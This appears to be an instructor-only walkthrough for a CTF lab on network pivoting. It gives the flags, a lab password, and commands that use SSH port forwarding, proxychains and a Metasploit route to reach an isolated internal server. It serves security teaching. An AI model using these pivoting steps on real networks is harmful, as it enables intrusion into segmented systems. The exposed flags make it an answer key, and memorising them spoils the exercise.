# Week 9 CTF Walkthrough — INSTRUCTOR ONLY

> **Do not distribute to students before the end of the session.**

---

## Flag 1 — user.txt (`flag{w9_pivot_host_accessed}`)

**Step 1 — SSH to the pivot host:**
```bash
ssh pivotuser@10.10.9.10
# Password: pivot123
```

**Step 2 — Read the flag:**
```bash
cat /home/pivotuser/user.txt
```

---

## Flag 2 — root.txt (`flag{w9_internal_net_breached}`)

The internal web server at `10.10.90.20` is not reachable from the attacker directly.

**Step 1 — Set up SSH local port forward:**
```bash
ssh -L 8080:10.10.90.20:80 pivotuser@10.10.9.10 -N &
```

**Step 2 — Retrieve the flag via the forwarded port:**
```bash
curl http://127.0.0.1:8080/root.txt
```

**Alternative — Dynamic SOCKS proxy with proxychains:**
```bash
ssh -D 1080 pivotuser@10.10.9.10 -N &
proxychains curl http://10.10.90.20/root.txt
```

**Alternative — Metasploit route:**
```
msf6 > use auxiliary/server/socks_proxy
msf6 > route add 10.10.90.0/24 <session_id>
```

---

## Teaching Points

- `flag{w9_pivot_host_accessed}` demonstrates initial foothold on the dual-homed pivot machine
- `flag{w9_internal_net_breached}` proves students can reach the isolated internal segment — the core week 9 skill
- The `internal: true` Docker network means the flag is unreachable without a working pivot — students cannot skip the technique
- SSH `-L` (local forward) is the simplest pivot method; SOCKS proxy with proxychains is the most flexible
